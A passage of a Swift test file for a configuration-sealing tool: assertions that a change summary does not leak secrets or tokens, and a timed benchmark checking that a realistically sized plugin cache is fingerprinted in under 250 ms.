        #expect(ConfigSeal.heldChanges(in: answer)[item.name] == "~/bin/post changed")
        let line = answer[ConfigSeal.heldKey] ?? ""
        #expect(!line.isEmpty)
        #expect(!line.contains(secret) && !line.contains("an0ther-value") && !line.contains("--token"), "\(line)")
    }
}

/// The plugin seal's bench: judged by wall-clock time, so it runs only in `scripts/test.sh --perf` (`Tag.perf`).
struct ConfigSealPluginBenchTests {
    let seal = ConfigSealTests()
    var home: String { seal.home }

    /// A plugin cache as big as this Mac's (16 installs, 12 enabled, ~1,550 files; measured there: 15 plugin and
    /// script items, 75 parts, ~6 ms) is fingerprinted well under 250 ms: only what runs is read.
    @Test(.tags(.perf), .enabled(if: perfRun, perfOnly)) func aRealSizedPluginCacheIsFingerprintedFast() throws {
        var installed: [String: String] = [:]
        for index in 0..<16 {
            let root = try seal.plugin("p\(index)", installed: installed)
            installed["p\(index)"] = root
            for file in 0..<90 { try seal.write("doc \(file)\n", root + "/skills/s\(file % 9)/\(file).md") }
        }
        try seal.enable(Dictionary(uniqueKeysWithValues: (0..<16).map { ("p\($0)", $0 < 12) }))
        let watched = ConfigSeal.homeWatched(home: home).filter { ConfigSeal.isPlugin(name: $0.name) || ConfigSeal.isScripts(name: $0.name) }
        #expect(watched.count == 14)
        let start = ContinuousClock.now
        let hashes = ConfigSeal.hashes(of: watched)
        let took = ContinuousClock.now - start
        #expect(hashes.count == 28)
        #expect(took < .milliseconds(250), "\(took)")
    }
}
